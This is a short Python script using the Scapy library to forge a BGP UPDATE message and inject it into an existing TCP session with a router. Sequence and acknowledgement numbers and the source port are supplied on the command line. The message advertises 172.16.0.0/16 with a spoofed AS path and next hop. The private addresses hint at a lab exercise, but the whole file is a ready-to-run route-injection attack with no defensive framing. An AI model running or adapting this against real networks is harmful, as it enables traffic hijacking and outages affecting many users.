from scapy.all import *
from scapy.contrib.bgp import *
from scapy.layers.inet import IP, TCP
load_contrib('bgp')


# Pass seq num, ack num, and source port on cmd line

base= IP(src="192.168.4.1", dst="192.168.4.2", proto=6, ttl=1)
tcp = TCP(dport=179, sport=int(sys.argv[3]), seq=int(sys.argv[1]), ack=int(sys.argv[2]), flags="PA")

#Type 3 is notification, marker is used for authentication, max hex for no auth(32 fs)
BGPHeader = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)

# All of the segments in the BGP update message
Origin = BGPPathAttr(type_flags=64, type_code=1, attribute=BGPPAOrigin(0))
Path = BGPPathAttr(type_flags=64, type_code=2, attribute=BGPPAAS4BytesPath(segments=['1000', '1050']))
nextHop = BGPPathAttr(type_flags=64, type_code=4, attribute=BGPPANextHop(next_hop="192.168.4.2"))



# Put all segments of the update message together
UpdateBGP = BGPUpdate(path_attr=[Origin, nextHop, Path], nlri=BGPNLRI_IPv4(prefix="172.16.0.0/16"))

# Form all layers of the packet together, display it and then send it
packet = base / tcp / BGPHeader / UpdateBGP
packet.show2()
send(packet)